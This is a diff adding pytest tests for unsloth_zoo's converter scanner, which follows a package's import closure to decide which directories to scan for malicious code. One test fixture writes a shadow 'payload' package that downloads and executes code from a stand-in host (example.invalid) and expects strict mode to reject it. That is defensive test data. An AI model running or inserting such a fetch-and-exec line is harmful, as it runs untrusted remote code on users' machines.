@@ -1684,6 +1684,83 @@ def test_a_sibling_script_unsloth_never_runs_does_not_widen_the_scan(tmp_path):
     assert "examples" not in labels, sorted(labels)
 
 
+def test_the_import_closure_is_followed_past_the_first_hop(tmp_path, monkeypatch):
+    """A nested module's imports are part of what the converter runs.
+
+    Reading only each package's direct modules stopped the closure one hop in:
+    conversion/__init__.py imports conversion.nested.mod, that module imports a
+    root `payload` package, and payload was never made a scan location, so strict
+    mode executed it without reading it.
+    """
+    llama_cpp = _load("llama_cpp_closure_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    nested = root / "conversion" / "nested"
+    nested.mkdir()
+    (nested / "__init__.py").write_text("", encoding = "utf-8")
+    (nested / "mod.py").write_text("import payload\n", encoding = "utf-8")
+    init = root / "conversion" / "__init__.py"
+    init.write_text(
+        "from .nested import mod\n" + init.read_text(encoding = "utf-8"),
+        encoding = "utf-8",
+    )
+    shadow = root / "payload"
+    shadow.mkdir()
+    (shadow / "__init__.py").write_text(
+        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
+        encoding = "utf-8",
+    )
+
+    assert "payload" in {
+        location.label for location in llama_cpp._scanned_locations(str(root)).locations
+    }
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_a_checkout_with_no_readable_entrypoint_still_narrows(tmp_path):
+    """The closure is seeded from the entrypoint and from the packages it
+    imports. Seeding from the entrypoint alone looks equivalent, because the
+    packages are taken by name and feed their imports back, but a checkout whose
+    entrypoint is missing or unparseable then yields nothing, and nothing means
+    every directory is scanned again.
+    """
+    llama_cpp = _load("llama_cpp_no_entrypoint_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    assert not (root / "convert_hf_to_gguf.py").exists(), "the point of this layout"
+    (root / "scripts").mkdir()
+    (root / "scripts" / "bench.py").write_text("X = 1\n", encoding = "utf-8")
+
+    labels = {
+        location.label for location in llama_cpp._scanned_locations(str(root)).locations
+    }
+    assert "scripts" not in labels, sorted(labels)
+
+
+def test_a_directory_admitted_late_can_still_reach_an_earlier_one(tmp_path):
+    """The closure grows as it is walked, so one scandir pass is not enough: a
+    directory admitted late imports the name of one that was already passed over,
+    and nothing would go back for it.
+    """
+    llama_cpp = _load("llama_cpp_fixpoint_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    # "aaa" sorts before "zzz", so a single pass sees it first and skips it.
+    (root / "aaa").mkdir()
+    (root / "aaa" / "mod.py").write_text("X = 1\n", encoding = "utf-8")
+    (root / "zzz").mkdir()
+    (root / "zzz" / "__init__.py").write_text("import aaa\n", encoding = "utf-8")
+    _converter_imports(root, "zzz")
+
+    labels = {
+        location.label for location in llama_cpp._scanned_locations(str(root)).locations
+    }
+    assert {"zzz", "aaa"} <= labels, sorted(labels)
+
+
 def test_a_from_import_counts_as_reaching_the_directory(tmp_path):
     """`from shadow import payload` is the import that made these directories
     worth scanning in the first place, so the name collector has to see it."""
